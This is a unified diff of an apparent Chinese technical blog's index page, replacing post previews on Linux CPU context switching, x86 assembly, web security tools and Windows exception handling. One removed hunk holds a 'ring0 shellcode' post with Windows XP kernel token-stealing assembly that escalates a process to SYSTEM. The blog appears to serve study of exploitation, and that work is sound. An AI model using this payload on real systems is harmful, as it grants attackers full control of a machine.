@@ -157,20 +157,20 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-2.CPU上下文切换" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-3.CPU使用率到100%" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/30/2.CPU上下文切换/">2.CPU上下文切换</a>
+      <a class="article-title" href="/2018/09/30/3.CPU使用率到100%/">3.CPU使用率到100%</a>
     </h1>
   
 
 		
         
-        <a href="/2018/09/30/2.CPU上下文切换/" class="archive-article-date">
+        <a href="/2018/09/30/3.CPU使用率到100%/" class="archive-article-date">
   	<time datetime="2018-09-30T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-30</time>
 </a>
         
@@ -179,31 +179,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>在很短时间内,CPU进行任务切换,造成多任务的错觉。<br>而每个任务运行前,CPU根据CPU寄存器和程序技术器获得任务从哪加载,从哪运行。<br>而保持这些数据的环境为CPU上下文。<br>根据任务不同,分为进程上下文切换,线程上下文切换和中断上下文切换</p>
-<blockquote>
-<p>进程上下文切换<br>区分系统调用和进程上下文切换</p>
-</blockquote>
-<p>系统调用不涉及虚拟内存等用户态的资源,一直在同一个进程中进行。<br>进程上下文切换是从一个进程切换到另一个进程中运行。进程的上下文中包括虚拟内存,栈,全局变量以及内核堆栈和寄存器等内核空间的状态。<br>linux通过TLB管理虚拟内存到物理内存的映射关系,当虚拟内存刷新时,TLB也需要刷新,内存访问也会变量.对于多处理器系统,缓存是共享的,刷新缓存不仅会影响当前处理器的进程,还会影响共享缓存的其他处理器的进程。<br>linux为CPU维护一个就绪队列,根据优先级和等待CPU的时间排序,然后选择最需要的CPU进程(优先级最高和等待cpu时间最长的进程)。</p>
-<ul>
-<li>进程调度场景<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.为保证进程公平调度,CPU被划分成一段段时间片,这些时间片轮流分配到各个进程,进程时间片耗尽,系统被挂起,切换到其他等待CPU的进程运行。</span><br><span class="line">2.系统资源不足时,要等待资源满足才能运行,进程也会被挂起,系统调度其他进程运行。</span><br><span class="line">3.进程调用sleep这样的方法让自己主动挂起时,也会重新调度。</span><br><span class="line">4.当有优先级更高的进程运行时,保证高优先级进程的调度,进程会被挂起,从高优先级进程运行</span><br><span class="line">5.发生硬件中断时,CPU上进程会被中断挂起。</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<blockquote>
-<p>线程上下文切换</p>
-</blockquote>
-<p>当有多个线程时,线程共用相同的虚拟内存和全局变量等资源,这些资源在上下文切换时不需要修改。<br>线程由自己的私有数据,比如栈和寄存器,这些在上下文切换是需要保存的。<br>对于同一进程的线程上下文切换,只切换线程的私有数据,寄存器不共享。</p>
-<blockquote>
-<p>中断上下文切换</p>
-</blockquote>
-<p>为了快速响应硬件事件,中断处理打断进程的正常调度和执行,转而调用中断处理程序,响应设备事件。<br>中断上下文切换至包括内核态中断服务程序执行所需要的状态,包括CPU寄存器,内核堆栈,硬件中断参数等。<br>对同一个 CPU 来说，中断处理比进程拥有更高的优先级。</p>
-<blockquote>
-<p>查看系统的上下文中断</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop# vmstat 5</span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class="line"> 0  0      0 6770348  95812 707136    0    0   169    78  140  232 22  6 69  3  0</span><br><span class="line"> 0  0      0 6770456  95812 707168    0    0     0     0  284  783  3  2 95  0  0</span><br><span class="line"> 0  0      0 6770520  95820 707168    0    0     0     3  408  964  5  4 91  0  0</span><br><span class="line"> 0  0      0 6770520  95820 707168    0    0     0     0  348  883  5  5 90  0  0</span><br><span class="line"> 0  0      0 6769768  95820 707168    0    0     0     0  225  580  2  3 95  0  0</span><br><span class="line"> 0  0      0 6769768  95820 707168    0    0     0     0   90  187  1  1 98  0  0</span><br><span class="line"> 1  0      0 6769760  95820 707168    0    0     0     0  258  470  1  1 98  0  0</span><br><span class="line">cs每秒上下文切换次数</span><br><span class="line">in 每秒中断次数</span><br><span class="line">r 就绪队列的个数,即为正在运行和等待的进程个数</span><br><span class="line">b 处于不可中断睡眠状态的进程个数</span><br><span class="line">us 用户使用cpu占比</span><br><span class="line">sy 系统使用cpu占比</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@ubuntu:~/Desktop# pidstat -w 5</span><br><span class="line">Linux 4.2.0-27-generic (ubuntu) 	11/27/2018 	_x86_64_	(2 CPU)</span><br><span class="line"></span><br><span class="line">05:55:14 PM   UID       PID   cswch/s nvcswch/s  Command</span><br><span class="line">05:55:19 PM     0         7     16.76      0.00  rcu_sched</span><br><span class="line">05:55:19 PM     0         9      9.16      0.00  rcuos/0</span><br><span class="line">05:55:19 PM     0        12      0.39      0.00  watchdog/</span><br><span class="line">cswch 每秒自愿上下文中断 进程无法获取资源导致的上下文切换</span><br><span class="line">nvcswch 每秒非自愿上下文中断 进程由于时间片已到,系统调度发生的上下文切换</span><br></pre></td></tr></table></figure>
-<ul>
-<li>案例分析<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sysbench 多线程基准测试工具,用来评估不同系统参数下的数据库负载情况。</span><br><span class="line">可以用来模拟系统多线程调度切换的情况。</span><br><span class="line">apt-get install sysbench sysstat</span><br><span class="line"></span><br><span class="line"># 以 10 个线程运行 5 分钟的基准测试，模拟多线程切换的问题</span><br><span class="line">sysbench --threads=10 --max-time=300 threads run</span><br><span class="line"></span><br><span class="line">#每隔vmstat一秒查看上下文切换情况</span><br><span class="line">vmstat 1 1</span><br><span class="line">看到cs和in很高</span><br><span class="line">#查看进程</span><br><span class="line">pidstat -w 5 进程上下文切换</span><br><span class="line">pidstat -wt 5 线程上下文切换</span><br><span class="line">#查看中断上下文切换</span><br><span class="line">watch -d cat /proc/interrupts //-d 表示高亮显示变化的区域</span><br><span class="line">其中RES(重调度中断),这个中断类型,唤醒空闲状态的CPU来调度新的任务运行。是多处理器系统调度器用来分散任务到不同CPU的机制，称为处理器间中断。</span><br></pre></td></tr></table></figure></li>
-</ul>
-
+        
       
 
       
@@ -226,91 +202,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/30/2.CPU上下文切换/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-web安全工具" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/30/web安全工具/">web安全工具</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/09/30/web安全工具/" class="archive-article-date">
-  	<time datetime="2018-09-30T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-30</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ul>
-<li>http拦截工具<br>Burp Suite Proxy<br>Fiddler<br>WinSock Expert</li>
-<li>信息探测<br>Namp<br>DirBuster</li>
-<li>漏洞扫描<br>Burp Suite<br>AWVS<br>AppScan</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/30/web安全工具/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/09/30/3.CPU使用率到100%/">展开全文 >></a>
         </p>
       
 
@@ -437,20 +329,20 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-ATT-Unitx下c汇编" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-web安全工具" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/30/ATT-Unitx下c汇编/">ATT-Unitx下c汇编</a>
+      <a class="article-title" href="/2018/09/30/web安全工具/">web安全工具</a>
     </h1>
   
 
 		
         
-        <a href="/2018/09/30/ATT-Unitx下c汇编/" class="archive-article-date">
+        <a href="/2018/09/30/web安全工具/" class="archive-article-date">
   	<time datetime="2018-09-30T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-30</time>
 </a>
         
@@ -459,26 +351,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Unix下的GCC产生的汇编是ATT</p>
-<blockquote>
-<p>程序编程</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gcc -Og -o p p1.c p2.c </span><br><span class="line">-Og高速编译器生成符合原始C语言机器代码的优化等级 如果为了程序性能考虑执行选线-O1/-O2 </span><br><span class="line">-o 生成可执行文件</span><br><span class="line">编译器: 将产生的2个源文件的汇编代码,后缀为.s</span><br><span class="line">汇编器: 将汇编代码转成二进制目标文件,后缀为.o</span><br><span class="line">链接器: 将目标二进制目标文件和库函数代码合并,并产生最终的可执行文件。</span><br><span class="line">-S 生成汇编代码,后缀为.s</span><br><span class="line">-c 生成二进制目标文件,后缀为.o</span><br><span class="line"></span><br><span class="line">gcc -Og -S -masm=intel p1.c //生成inter汇编格式</span><br><span class="line">-masm=intel</span><br><span class="line">objdumpp -d p1.o</span><br><span class="line">将二进制文件反汇编成汇编代码</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>访问信息</p>
-</blockquote>
-<ul>
-<li><p>寄存器</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rax eax ax al/ah</span><br><span class="line">rbx ebx bx bl/bh</span><br><span class="line">rcx ecx cx dl/dh</span><br><span class="line">rdx edx dx dl/dh</span><br><span class="line">rsi esi si </span><br><span class="line">rdi edi di</span><br><span class="line">rbp ebp bp</span><br><span class="line">rsp esp sp</span><br><span class="line">r8</span><br><span class="line">r9</span><br><span class="line">r10</span><br><span class="line">r11</span><br><span class="line">r12</span><br><span class="line">r13</span><br><span class="line">r14</span><br><span class="line">r15</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>数据传送指令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">movb</span><br><span class="line">movw </span><br><span class="line">movl  //特殊 会讲高4字节设置为0</span><br><span class="line">movq  //只能以表示为32位补码数字的立即数作为源操作数,然后符号扩展到64的值放到目的位置</span><br><span class="line">movabsq //可以任意64位立即数值作为源操作数,并只能以寄存器作为目的</span><br><span class="line"></span><br><span class="line">movzbw //将0扩展的字节传送到字</span><br><span class="line">movzbl //将0扩展的字节传送到双字</span><br><span class="line">movzwl //将0扩展的字传送到双字</span><br><span class="line">movzbq //将0扩展的字节传送到四字</span><br><span class="line">movzwq //将0扩展的字传送到四字</span><br><span class="line">movl相当于将0扩展的双字传送到四字</span><br><span class="line"></span><br><span class="line">movsbw</span><br><span class="line">movsbl</span><br><span class="line">movswl</span><br><span class="line">movsbq</span><br><span class="line">movswq</span><br><span class="line">movslq</span><br><span class="line">cltq  将eax符号扩展到rax</span><br></pre></td></tr></table></figure>
-</li>
+        <ul>
+<li>http拦截工具<br>Burp Suite Proxy<br>Fiddler<br>WinSock Expert</li>
+<li>信息探测<br>Namp<br>DirBuster</li>
+<li>漏洞扫描<br>Burp Suite<br>AWVS<br>AppScan</li>
 </ul>
-<blockquote>
-<p>浮点指令</p>
-</blockquote>
-<p>+传送浮点指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vmovss 传送单精度数</span><br><span class="line">vmovsd 传送双精度数</span><br><span class="line">vmovaps 传送对齐的封装好的单精度数</span><br><span class="line">vmovapd 传送对齐的封装好的双精度数</span><br></pre></td></tr></table></figure></p>
 
       
 
@@ -492,7 +369,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">汇编</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
         		</li>
       		
 		</ul>
@@ -502,7 +379,110 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/30/ATT-Unitx下c汇编/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/09/30/web安全工具/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-2.CPU上下文切换" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/30/2.CPU上下文切换/">2.CPU上下文切换</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/09/30/2.CPU上下文切换/" class="archive-article-date">
+  	<time datetime="2018-09-30T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-30</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在很短时间内,CPU进行任务切换,造成多任务的错觉。<br>而每个任务运行前,CPU根据CPU寄存器和程序技术器获得任务从哪加载,从哪运行。<br>而保持这些数据的环境为CPU上下文。<br>根据任务不同,分为进程上下文切换,线程上下文切换和中断上下文切换</p>
+<blockquote>
+<p>进程上下文切换<br>区分系统调用和进程上下文切换</p>
+</blockquote>
+<p>系统调用不涉及虚拟内存等用户态的资源,一直在同一个进程中进行。<br>进程上下文切换是从一个进程切换到另一个进程中运行。进程的上下文中包括虚拟内存,栈,全局变量以及内核堆栈和寄存器等内核空间的状态。<br>linux通过TLB管理虚拟内存到物理内存的映射关系,当虚拟内存刷新时,TLB也需要刷新,内存访问也会变量.对于多处理器系统,缓存是共享的,刷新缓存不仅会影响当前处理器的进程,还会影响共享缓存的其他处理器的进程。<br>linux为CPU维护一个就绪队列,根据优先级和等待CPU的时间排序,然后选择最需要的CPU进程(优先级最高和等待cpu时间最长的进程)。</p>
+<ul>
+<li>进程调度场景<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.为保证进程公平调度,CPU被划分成一段段时间片,这些时间片轮流分配到各个进程,进程时间片耗尽,系统被挂起,切换到其他等待CPU的进程运行。</span><br><span class="line">2.系统资源不足时,要等待资源满足才能运行,进程也会被挂起,系统调度其他进程运行。</span><br><span class="line">3.进程调用sleep这样的方法让自己主动挂起时,也会重新调度。</span><br><span class="line">4.当有优先级更高的进程运行时,保证高优先级进程的调度,进程会被挂起,从高优先级进程运行</span><br><span class="line">5.发生硬件中断时,CPU上进程会被中断挂起。</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>线程上下文切换</p>
+</blockquote>
+<p>当有多个线程时,线程共用相同的虚拟内存和全局变量等资源,这些资源在上下文切换时不需要修改。<br>线程由自己的私有数据,比如栈和寄存器,这些在上下文切换是需要保存的。<br>对于同一进程的线程上下文切换,只切换线程的私有数据,寄存器不共享。</p>
+<blockquote>
+<p>中断上下文切换</p>
+</blockquote>
+<p>为了快速响应硬件事件,中断处理打断进程的正常调度和执行,转而调用中断处理程序,响应设备事件。<br>中断上下文切换至包括内核态中断服务程序执行所需要的状态,包括CPU寄存器,内核堆栈,硬件中断参数等。<br>对同一个 CPU 来说，中断处理比进程拥有更高的优先级。</p>
+<blockquote>
+<p>查看系统的上下文中断</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop# vmstat 5</span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class="line"> 0  0      0 6770348  95812 707136    0    0   169    78  140  232 22  6 69  3  0</span><br><span class="line"> 0  0      0 6770456  95812 707168    0    0     0     0  284  783  3  2 95  0  0</span><br><span class="line"> 0  0      0 6770520  95820 707168    0    0     0     3  408  964  5  4 91  0  0</span><br><span class="line"> 0  0      0 6770520  95820 707168    0    0     0     0  348  883  5  5 90  0  0</span><br><span class="line"> 0  0      0 6769768  95820 707168    0    0     0     0  225  580  2  3 95  0  0</span><br><span class="line"> 0  0      0 6769768  95820 707168    0    0     0     0   90  187  1  1 98  0  0</span><br><span class="line"> 1  0      0 6769760  95820 707168    0    0     0     0  258  470  1  1 98  0  0</span><br><span class="line">cs每秒上下文切换次数</span><br><span class="line">in 每秒中断次数</span><br><span class="line">r 就绪队列的个数,即为正在运行和等待的进程个数</span><br><span class="line">b 处于不可中断睡眠状态的进程个数</span><br><span class="line">us 用户使用cpu占比</span><br><span class="line">sy 系统使用cpu占比</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@ubuntu:~/Desktop# pidstat -w 5</span><br><span class="line">Linux 4.2.0-27-generic (ubuntu) 	11/27/2018 	_x86_64_	(2 CPU)</span><br><span class="line"></span><br><span class="line">05:55:14 PM   UID       PID   cswch/s nvcswch/s  Command</span><br><span class="line">05:55:19 PM     0         7     16.76      0.00  rcu_sched</span><br><span class="line">05:55:19 PM     0         9      9.16      0.00  rcuos/0</span><br><span class="line">05:55:19 PM     0        12      0.39      0.00  watchdog/</span><br><span class="line">cswch 每秒自愿上下文中断 进程无法获取资源导致的上下文切换</span><br><span class="line">nvcswch 每秒非自愿上下文中断 进程由于时间片已到,系统调度发生的上下文切换</span><br></pre></td></tr></table></figure>
+<ul>
+<li>案例分析<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sysbench 多线程基准测试工具,用来评估不同系统参数下的数据库负载情况。</span><br><span class="line">可以用来模拟系统多线程调度切换的情况。</span><br><span class="line">apt-get install sysbench sysstat</span><br><span class="line"></span><br><span class="line"># 以 10 个线程运行 5 分钟的基准测试，模拟多线程切换的问题</span><br><span class="line">sysbench --threads=10 --max-time=300 threads run</span><br><span class="line"></span><br><span class="line">#每隔vmstat一秒查看上下文切换情况</span><br><span class="line">vmstat 1 1</span><br><span class="line">看到cs和in很高</span><br><span class="line">#查看进程</span><br><span class="line">pidstat -w 5 进程上下文切换</span><br><span class="line">pidstat -wt 5 线程上下文切换</span><br><span class="line">#查看中断上下文切换</span><br><span class="line">watch -d cat /proc/interrupts //-d 表示高亮显示变化的区域</span><br><span class="line">其中RES(重调度中断),这个中断类型,唤醒空闲状态的CPU来调度新的任务运行。是多处理器系统调度器用来分散任务到不同CPU的机制，称为处理器间中断。</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">linux优化</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/09/30/2.CPU上下文切换/">展开全文 >></a>
         </p>
       
 
@@ -926,20 +906,20 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-内核shellcode" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-windows异常与调试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/内核shellcode/">ring0 shellcode</a>
+      <a class="article-title" href="/2018/08/20/windows异常与调试/">异常与调试</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/内核shellcode/" class="archive-article-date">
+        <a href="/2018/08/20/windows异常与调试/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -948,10 +928,28 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>提权到SYSTEM 修改当前进程的token为SYSTEM进程的token</p>
+        <p>Windows异常处理:<br>SEH-结构化异常处理<br>VEH-向量化异常处理<br>VCH-向量化异常处理</p>
+<blockquote>
+<p>SEH-结构化异常处理</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">DWORD g_uCro;</span><br><span class="line">DWORD g_isRing0ShellCodeCalled = 0;</span><br><span class="line">NTSTATUS MyshellCode() &#123;</span><br><span class="line">	//关闭内核写保护</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		cli</span><br><span class="line">		mov eax,cr0</span><br><span class="line">		mov g_uCro,eax</span><br><span class="line">		and eax,0xFFFEFFFF</span><br><span class="line">		mov cro,eax</span><br><span class="line">	&#125;</span><br><span class="line">	//提权到system</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax,0xFFDFF124 //eax = KPCR(not 3G Mode)</span><br><span class="line">		mov eax,[eax]      //获取当前线程PETHREAD</span><br><span class="line">		mov esi,[eax+0x220] //获取当前进程所属进程的PEROCESS</span><br><span class="line">		mov eax,esi</span><br><span class="line">		searchXp:</span><br><span class="line">			mov eax,[eax+0x88]</span><br><span class="line">			sub eax,0x88 //获取进程链表下一个进程的PEPROCESS</span><br><span class="line">			mov edx,[eax+0x84] //获取进程的PID到edx</span><br><span class="line">			cmp edx,0x4 //通过PID查找SYSTEM进程</span><br><span class="line">			jne searchXp</span><br><span class="line">			mov eax,[eax+0xc8] //获取system进程的token</span><br><span class="line">			mov [esi+0xc8],eax //修改当前进程的token</span><br><span class="line">	&#125;</span><br><span class="line">	//恢复内核写保护</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		sti</span><br><span class="line">		mov eax,g_uCro</span><br><span class="line">		mov cro,eax</span><br><span class="line">	&#125;</span><br><span class="line">	g_isRing0ShellCodeCalled = 1;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__try&#123;&#125;</span><br><span class="line">__finally&#123;&#125; //必定会执行 通过AbnormalTermiantion(void)获取是正常方式还是非正常方式</span><br><span class="line"></span><br><span class="line">__try&#123;&#125;</span><br><span class="line">__except&#123;&#125;</span><br><span class="line"></span><br><span class="line">//EXCEPTION_EXECUTE_HANDLER(1) ：执行异常处理块，不回到异常产生处</span><br><span class="line">//EXCEPTION_CONTINUE_SEARCH(0) ：处理不了，找别人吧</span><br><span class="line">//EXCEPTION_CONTINUE_EXECUTION(-1)：不相信这个事实，再执行一下试试</span><br><span class="line">//GetExceptionCode() 返回异常类型</span><br><span class="line">//GetExceptionInformation() 包含上下文信息 以及异常的类型等信息</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;tchar.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int a;</span><br><span class="line"></span><br><span class="line">DWORD Filter(DWORD Code, _EXCEPTION_POINTERS * pexception_Point, int **p) &#123;</span><br><span class="line">	if 